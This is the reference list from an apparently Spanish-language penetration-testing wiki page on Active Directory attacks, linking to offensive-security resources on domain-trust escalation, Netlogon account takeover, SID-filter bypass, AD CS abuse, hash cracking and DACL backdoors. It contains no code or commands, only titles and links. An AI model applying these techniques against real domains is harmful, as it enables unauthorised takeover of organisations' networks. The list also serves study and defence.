- [3] [De Domain Admin a Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Colección LDAP BOF – Toolkit LDAP en memoria para la explotación de Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – ¡Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Diseccionando Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Un viaje por las interfaces Null Session y MS-RPC olvidadas](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [¿SID filter como límite de seguridad entre dominios? (Parte 4) - Investigación sobre la evasión del filtrado de SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [¿SID filter como límite de seguridad entre dominios? (Parte 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [¿SID filter como límite de seguridad entre dominios? (Parte 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA a EA con ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalando de los administradores del child domain a Enterprise Admins en 5 minutos abusando de AD CS, una continuación](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Un ACE bajo la manga: diseño de backdoors DACL de Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
